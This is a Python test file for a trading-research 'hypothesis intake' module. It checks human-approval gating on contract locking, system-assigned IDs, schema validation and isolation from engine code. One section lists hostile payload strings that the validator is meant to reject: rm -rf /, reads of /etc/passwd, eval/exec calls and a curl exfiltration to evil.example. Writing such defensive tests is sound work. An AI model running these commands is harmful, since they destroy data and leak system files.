"""
Tests for Phase 1 Slice C (post-audit): research/brain/hypothesis_intake.py.

Covers the original 15-point checklist AND the 3 audit-fix items Vaibhav
asked for after reviewing the first Slice C report:

    #1 locking requires an explicit, named human approver on that exact call
       (create_draft() never locks; approve_and_lock() always requires
       approved_by; intake() defaults to lock=False)
    #4 contract_id is system-assigned, never proposer-supplied

(#2 engine.watchlist boundary and #3 no-eval/exec/compile are covered in
tests/test_research_engine_boundary.py, added for this audit pass.)

Nothing here touches engine/, research/replay.py, research/schema.sql, or
Claude permissions.

Run with:  python -m tests.test_research_hypothesis_intake
"""

import sys
import json
import shutil
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from research.store import Store  # noqa: E402
from research import memory as rm  # noqa: E402
from research.contracts import Contract, REGISTRY_DIR  # noqa: E402
from research.brain import hypothesis_intake as hi  # noqa: E402

PASSED, FAILED = 0, 0


def check(name, condition, detail=""):
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  ✓ {name}")
    else:
        FAILED += 1
        print(f"  ✗ {name}")
        if detail:
            print(f"      {detail}")


TMP = Path(tempfile.mkdtemp(prefix="lq-test-intake-"))


def fresh_store(name) -> Store:
    p = TMP / f"{name}.db"
    if p.exists():
        p.unlink()
    return Store.open(p)


def fresh_registry(name) -> Path:
    d = TMP / f"registry-{name}"
    if d.exists():
        shutil.rmtree(d)
    return d


def make_valid_proposal(**overrides):
    """No contract_id — identity is system-assigned. Pass hypothesis_id in
    overrides to attach a new variant to an existing claim."""
    base = {
        "title": "Volume-spike drift",
        "hypothesis": ("High-volume anomalies (>=3 sigma) precede a short-term "
                        "upward drift in liquid large-caps."),
        "null_hypothesis": "Volume anomalies have no relationship to subsequent returns.",
        "universe": "watchlist",
        "signal": "observatory.volume_zscore",
        "entry_rule": {"conditions": [{"metric": "volume_zscore", "op": ">", "value": 3.0}]},
        "exit_rule": {"stop_loss_pct": 2.0, "target_pct": 4.0, "max_hold_days": 10},
        "splits": {
            "discovery": ["2019-01-01", "2022-12-31"],
            "validation": ["2023-01-01", "2024-12-31"],
        },
        "independence": ("one entry per symbol per rolling 10-day window; "
                          "overlapping signals dropped"),
        "falsification": "expectancy_r <= 0 on the validation split, or t_stat < 2.0",
        "abandon_condition": ("if discovery-split expectancy_r <= 0, abandon "
                               "without touching validation"),
        "evaluation_start": "2019-01-01",
        "evaluation_end": "2022-12-31",
        "source": "research_cycle.claude",
    }
    base.update(overrides)
    return base


# ---------------------------------------------------------------------------
print("\n--- 1/2: a valid proposal is accepted and produces the expected DRAFT Contract ---")
# ---------------------------------------------------------------------------

store = fresh_store("valid")
reg = fresh_registry("valid")
proposal = make_valid_proposal()

problems = hi.validate_proposal(proposal)
check("a well-formed proposal has zero validation problems", problems == [], str(problems))

result = hi.create_draft(store, proposal, registry_dir=reg)
check("create_draft() returns a hypothesis id and a Contract",
      result.hypothesis_id.startswith("HYP-") and isinstance(result.contract, Contract))
check("the Contract carries the proposal's title/universe",
      result.contract.title == "Volume-spike drift" and result.contract.universe == "watchlist")
check("entry_rule round-trips to the exact structured rule submitted",
      json.loads(result.contract.entry_rule) == proposal["entry_rule"])
check("exit_rule round-trips to the exact structured rule submitted",
      json.loads(result.contract.exit_rule) == proposal["exit_rule"])
check("the system assigned a contract id of the form EXP-<suffix>-A",
      result.contract.id.startswith("EXP-") and result.contract.id.endswith("-A"),
      result.contract.id)

# Audit fix #1: create_draft() must NEVER lock.
check("create_draft() leaves the contract in draft status, NOT locked",
      result.contract.status == "draft")
check("create_draft() does not assign a locked_hash", result.contract.locked_hash is None)

reloaded_draft = Contract.load(result.contract.id, reg)
check("the draft was actually persisted to the registry directory",
      reloaded_draft.status == "draft" and reloaded_draft.title == "Volume-spike drift")

hyp_rows = rm.query_research_log(store, rm.DATASET_HYPOTHESIS)
check("create_draft() recorded the hypothesis claim in research memory", len(hyp_rows) == 1)
check("the recorded claim's hypothesis_id matches what create_draft() returned",
      hyp_rows[0]["payload"]["hypothesis_id"] == result.hypothesis_id)

check("the draft appears in pending_drafts()",
      result.contract.id in {c.id for c in hi.pending_drafts(reg)})


# ---------------------------------------------------------------------------
print("\n--- 3: approve_and_lock() performs the actual lock/hash, and only it does ---")
# ---------------------------------------------------------------------------

locked = hi.approve_and_lock(store, result.contract.id, approved_by="Vaibhav", registry_dir=reg)
check("approve_and_lock() locks the contract", locked.status == "locked")
check("a locked_hash was assigned", bool(locked.locked_hash))
check("the hash matches the contract's own recomputation",
      locked.locked_hash == locked.content_hash())
try:
    locked.verify()
    check("verify() accepts the freshly locked contract", True)
except Exception as e:
    check("verify() accepts the freshly locked contract", False, str(e))

reloaded_locked = Contract.load(result.contract.id, reg)
check("the locked contract was saved back to the registry directory",
      reloaded_locked.locked_hash == locked.locked_hash)
check("approving removed it from pending_drafts()",
      result.contract.id not in {c.id for c in hi.pending_drafts(reg)})

approval_notes = rm.query_research_log(store, rm.DATASET_NOTE)
check("approve_and_lock() wrote an audit-trail note to research memory",
      len(approval_notes) == 1)
check("the audit note names the approver and the contract",
      approval_notes[0]["payload"].get("approved_by") == "Vaibhav"
      and approval_notes[0]["payload"].get("contract_id") == result.contract.id)
check("the contract's own notes field also records who approved it",
      "Vaibhav" in reloaded_locked.notes)


# ---------------------------------------------------------------------------
print("\n--- Audit fix #1: locking is never implicit ---")
# ---------------------------------------------------------------------------

store_gate = fresh_store("gate")
reg_gate = fresh_registry("gate")

r1 = hi.intake(store_gate, make_valid_proposal(), registry_dir=reg_gate)
check("intake() with no lock argument defaults to a DRAFT, never locked",
      r1.contract.status == "draft")

try:
    hi.intake(store_gate, make_valid_proposal(), lock=True, registry_dir=reg_gate)
    check("intake(lock=True) without approved_by raises IntakeRejected", False)
except hi.IntakeRejected as e:
    check("intake(lock=True) without approved_by raises IntakeRejected",
          any("approved_by" in r for r in e.reasons))

r3 = hi.intake(store_gate, make_valid_proposal(), lock=True, approved_by="Vaibhav",
                registry_dir=reg_gate)
check("intake(lock=True, approved_by=...) DOES lock", r3.contract.status == "locked")

try:
    hi.approve_and_lock(store_gate, "EXP-DOES-NOT-EXIST", approved_by="Vaibhav",
                         registry_dir=reg_gate)
    check("approve_and_lock() on a nonexistent draft raises IntakeRejected", False)
except hi.IntakeRejected:
    check("approve_and_lock() on a nonexistent draft raises IntakeRejected", True)

try:
    hi.approve_and_lock(store_gate, r3.contract.id, approved_by="", registry_dir=reg_gate)
    check("approve_and_lock() with a blank approved_by raises IntakeRejected", False)
except hi.IntakeRejected:
    check("approve_and_lock() with a blank approved_by raises IntakeRejected", True)
still_locked = Contract.load(r3.contract.id, reg_gate)
check("a rejected blank-approver call did not touch the already-locked contract",
      still_locked.locked_hash == r3.contract.locked_hash)

try:
    hi.approve_and_lock(store_gate, r3.contract.id, approved_by="Someone Else",
                         registry_dir=reg_gate)
    check("re-approving an already-locked contract raises IntakeRejected (no silent re-lock)",
          False)
except hi.IntakeRejected as e:
    check("re-approving an already-locked contract raises IntakeRejected (no silent re-lock)",
          any("not a draft" in r for r in e.reasons))


# ---------------------------------------------------------------------------
print("\n--- 4: missing required fields are rejected ---")
# ---------------------------------------------------------------------------

for missing_field in ("falsification", "entry_rule", "universe", "splits", "title"):
    p = make_valid_proposal()
    del p[missing_field]
    problems = hi.validate_proposal(p)
    check(f"missing '{missing_field}' is rejected",
          any(missing_field in prob for prob in problems), str(problems))

store_missing = fresh_store("missing")
try:
    hi.create_draft(store_missing, {}, registry_dir=fresh_registry("missing"))
    check("create_draft() raises IntakeRejected on an empty proposal", False)
except hi.IntakeRejected as e:
    check("create_draft() raises IntakeRejected on an empty proposal", len(e.reasons) > 0)
check("nothing was written to research memory for the rejected empty proposal",
      rm.query_research_log(store_missing, rm.DATASET_HYPOTHESIS) == [])


# ---------------------------------------------------------------------------
print("\n--- Audit fix #4: contract_id is system-assigned, not proposer-supplied ---")
# ---------------------------------------------------------------------------

p_with_cid = make_valid_proposal(contract_id="EXP-001")
problems = hi.validate_proposal(p_with_cid)
check("a proposal supplying contract_id is rejected outright",
      any("contract_id" in prob and "system" in prob for prob in problems), str(problems))

store_cid = fresh_store("cid")
try:
    hi.create_draft(store_cid, p_with_cid, registry_dir=fresh_registry("cid"))
    check("create_draft() refuses a proposal carrying contract_id", False)
except hi.IntakeRejected:
    check("create_draft() refuses a proposal carrying contract_id", True)

# a hypothesis_id that was never actually issued is refused, not trusted
store_fake_hid = fresh_store("fake_hid")
try:
    hi.create_draft(store_fake_hid, make_valid_proposal(hypothesis_id="HYP-20200101-deadbeef"),
                     registry_dir=fresh_registry("fake_hid"))
    check("a hypothesis_id that was never issued is rejected", False)
except hi.IntakeRejected as e:
    check("a hypothesis_id that was never issued is rejected",
          any("does not correspond" in r for r in e.reasons))


# ---------------------------------------------------------------------------
print("\n--- 5: wrong types are rejected ---")
# ---------------------------------------------------------------------------

wrong_type_cases = [
    ("evaluation_start", 20190101),
    ("llm_features", "yes"),
    ("entry_rule", "volume_zscore > 3"),
    ("splits", ["discovery", "2019", "2022"]),
    ("title", 12345),
]
for field_name, bad_value in wrong_type_cases:
    p = make_valid_proposal(**{field_name: bad_value})
    problems = hi.validate_proposal(p)
    check(f"wrong type for '{field_name}' ({bad_value!r}) is rejected", len(problems) > 0, str(problems))


# ---------------------------------------------------------------------------
print("\n--- 6: unknown universe is rejected ---")
# ---------------------------------------------------------------------------

p = make_valid_proposal(universe="NASDAQ100")
problems = hi.validate_proposal(p)
check("an unrecognized universe is rejected",
      any("universe" in prob for prob in problems), str(problems))


# ---------------------------------------------------------------------------
print("\n--- 7: unsupported metric is rejected ---")
# ---------------------------------------------------------------------------

p = make_valid_proposal(entry_rule={"conditions": [
    {"metric": "insider_sentiment_score", "op": ">", "value": 3.0}]})
problems = hi.validate_proposal(p)
check("a metric outside the whitelist is rejected",
      any("metric" in prob for prob in problems), str(problems))


# ---------------------------------------------------------------------------
print("\n--- 8: unsupported operator is rejected ---")
# ---------------------------------------------------------------------------

p = make_valid_proposal(entry_rule={"conditions": [
    {"metric": "volume_zscore", "op": "~=", "value": 3.0}]})
problems = hi.validate_proposal(p)
check("an operator outside the whitelist is rejected",
      any("op" in prob for prob in problems), str(problems))


# ---------------------------------------------------------------------------
print("\n--- 9/10: arbitrary code / eval / exec / import / shell payloads are rejected ---")
# ---------------------------------------------------------------------------

malicious_payloads = [
    ("notes", "run this first: eval(open('/etc/passwd').read())"),
    ("signal", "__import__('os').system('rm -rf /')"),
    ("hypothesis", "see results after running `cat /etc/passwd` on the host"),
    ("independence", "clustered by day && curl http://evil.example/exfil"),
    ("null_hypothesis", "import subprocess; subprocess.run(['rm', '-rf', '/'])"),
    ("abandon_condition", "abandon after: exec(compile(payload, '<s>', 'exec'))"),
]
for field_name, payload_value in malicious_payloads:
    p = make_valid_proposal(**{field_name: payload_value})
    problems = hi.validate_proposal(p)
    check(f"code-like content in '{field_name}' is rejected",
          any("code-like" in prob for prob in problems), str(problems))

# structural firewall: even if a string sneaks past the regex scan, the rule
# fields are typed/whitelisted, so a raw code string can never *become* the
# entry/exit rule in the first place.
p_structural = make_valid_proposal(entry_rule="eval(__import__('os').system('ls'))")
problems = hi.validate_proposal(p_structural)
check("a raw string instead of a structured entry_rule is rejected on shape alone",
      any("entry_rule" in prob for prob in problems), str(problems))

store_evil = fresh_store("evil")
try:
    hi.create_draft(store_evil, make_valid_proposal(notes="eval(1+1)"),
                     registry_dir=fresh_registry("evil"))
    check("create_draft() raises IntakeRejected on a code-like payload", False)
except hi.IntakeRejected as e:
    check("create_draft() raises IntakeRejected on a code-like payload",
          any("code-like" in r for r in e.reasons))
check("nothing was written to research memory for the rejected malicious proposal",
      rm.query_research_log(store_evil, rm.DATASET_HYPOTHESIS) == [])
check("nothing was written to the registry for the rejected malicious proposal",
      not any((TMP / "registry-evil").glob("*.json")))


# ---------------------------------------------------------------------------
print("\n--- 11: invalid dates / windows are rejected ---")
# ---------------------------------------------------------------------------

date_cases = [
    make_valid_proposal(evaluation_start="not-a-date"),
    make_valid_proposal(evaluation_start="2024-01-01", evaluation_end="2023-01-01"),
    make_valid_proposal(splits={"discovery": ["2022-01-01", "2019-01-01"]}),
    make_valid_proposal(splits={"discovery": ["not-a-date", "2022-01-01"]}),
    make_valid_proposal(splits={"nonsense_split": ["2019-01-01", "2022-01-01"]}),
]
for i, p in enumerate(date_cases):
    problems = hi.validate_proposal(p)
    check(f"invalid date/window case {i} is rejected", len(problems) > 0, str(problems))


# ---------------------------------------------------------------------------
print("\n--- exit_rule / condition bounds ---")
# ---------------------------------------------------------------------------

bad_exit_cases = [
    make_valid_proposal(exit_rule={}),
    make_valid_proposal(exit_rule={"stop_loss_pct": -1.0}),
    make_valid_proposal(exit_rule={"stop_loss_pct": 2.0, "leverage": 5}),
    make_valid_proposal(exit_rule={"max_hold_days": 0}),
]
for i, p in enumerate(bad_exit_cases):
    problems = hi.validate_proposal(p)
    check(f"malformed exit_rule case {i} is rejected", len(problems) > 0, str(problems))

p_nan = make_valid_proposal(entry_rule={"conditions": [
    {"metric": "volume_zscore", "op": ">", "value": float("nan")}]})
check("a NaN condition value is rejected", len(hi.validate_proposal(p_nan)) > 0)

p_toomany = make_valid_proposal(entry_rule={"conditions": [
    {"metric": "volume_zscore", "op": ">", "value": 3.0},
    {"metric": "price_move_zscore", "op": ">", "value": 3.0},
    {"metric": "close", "op": ">", "value": 1.0},
    {"metric": "return_1d", "op": ">", "value": 0.01},
]})
check("more than MAX_CONDITIONS_PER_RULE conditions is rejected",
      len(hi.validate_proposal(p_toomany)) > 0)


# ---------------------------------------------------------------------------
print("\n--- 15: hypothesis identity is preserved independently from (system-assigned) "
      "Contract identity ---")
# ---------------------------------------------------------------------------

store_hyp = fresh_store("hyp_identity")
reg_hyp = fresh_registry("hyp_identity")

result_a = hi.create_draft(store_hyp, make_valid_proposal(), registry_dir=reg_hyp)
result_b = hi.create_draft(store_hyp, make_valid_proposal(
    hypothesis_id=result_a.hypothesis_id,
    exit_rule={"stop_loss_pct": 3.0, "target_pct": 6.0, "max_hold_days": 15},
), registry_dir=reg_hyp)

check("two different Contract ids can share one hypothesis_id",
      result_a.hypothesis_id == result_b.hypothesis_id)
check("the Contract ids themselves remain distinct",
      result_a.contract.id != result_b.contract.id)
check("the system auto-increments the variant letter for the second contract",
      result_a.contract.id.endswith("-A") and result_b.contract.id.endswith("-B"),
      f"{result_a.contract.id} / {result_b.contract.id}")
check("hypothesis_id is never equal to either contract id (separate namespaces)",
      result_a.hypothesis_id not in (result_a.contract.id, result_b.contract.id))

hyp_log = rm.query_research_log(store_hyp, rm.DATASET_HYPOTHESIS)
same_hid_rows = [r for r in hyp_log if r["payload"]["hypothesis_id"] == result_a.hypothesis_id]
check("both proposals under the shared hypothesis_id are recorded as claims",
      len(same_hid_rows) == 2, f"got {len(same_hid_rows)}")
check("each recorded claim links back to its own (system-assigned) contract_id",
      {r["payload"]["contract_id"] for r in same_hid_rows}
      == {result_a.contract.id, result_b.contract.id})

# a third, independent proposal (no hypothesis_id given) gets its OWN hypothesis
result_c = hi.create_draft(store_hyp, make_valid_proposal(title="an unrelated idea"),
                            registry_dir=reg_hyp)
check("a proposal with no hypothesis_id starts a brand-new hypothesis",
      result_c.hypothesis_id != result_a.hypothesis_id)
check("its contract id starts a fresh variant sequence at -A",
      result_c.contract.id.endswith("-A") and result_c.contract.id != result_a.contract.id)


# ---------------------------------------------------------------------------
print("\n--- persist_draft=False produces a draft without touching the registry directory ---")
# ---------------------------------------------------------------------------

store_draft = fresh_store("draft")
reg_draft = fresh_registry("draft")
result_draft = hi.create_draft(store_draft, make_valid_proposal(),
                                persist_draft=False, registry_dir=reg_draft)
check("persist_draft=False still returns a draft Contract", result_draft.contract.status == "draft")
check("persist_draft=False does not write anything to the registry directory",
      not reg_draft.exists() or not any(reg_draft.iterdir()))


# ---------------------------------------------------------------------------
print("\n--- Isolation: hypothesis_intake.py imports nothing from engine/ except the "
      "read-only watchlist, and writes only via Contract.save() ---")
# ---------------------------------------------------------------------------

import re  # noqa: E402

src = (Path(__file__).parent.parent / "research" / "brain" / "hypothesis_intake.py").read_text()
imports = re.findall(r"^\s*(?:from|import)\s+([.\w]+)", src, re.MULTILINE)
engine_imports = [m for m in imports if m.startswith("engine")]
check("the only engine import (if any) is engine.watchlist, read-only, inside a lazy helper",
      all(m == "engine.watchlist" for m in engine_imports), str(imports))
check("hypothesis_intake.py contains no file-write calls of its own "
      "(no open(...,'w'), no Path.write_*) — all persistence goes through Contract.save()",
      not re.search(r"open\([^)]*['\"]w", src) and ".write_text(" not in src
      and ".write(" not in src)
check("hypothesis_intake.py never calls eval, exec, or the builtin compile() "
      "(re.compile — ordinary regex compilation — is not what this checks for)",
      not re.search(r"\beval\s*\(|\bexec\s*\(|(?<!re\.)\bcompile\s*\(", src))


for s in (store, store_missing, store_evil, store_hyp, store_draft, store_gate,
          store_cid, store_fake_hid):
    s.close()

print(f"\n{'=' * 52}")
print(f"  {PASSED} passed, {FAILED} failed")
print(f"{'=' * 52}\n")
sys.exit(1 if FAILED else 0)
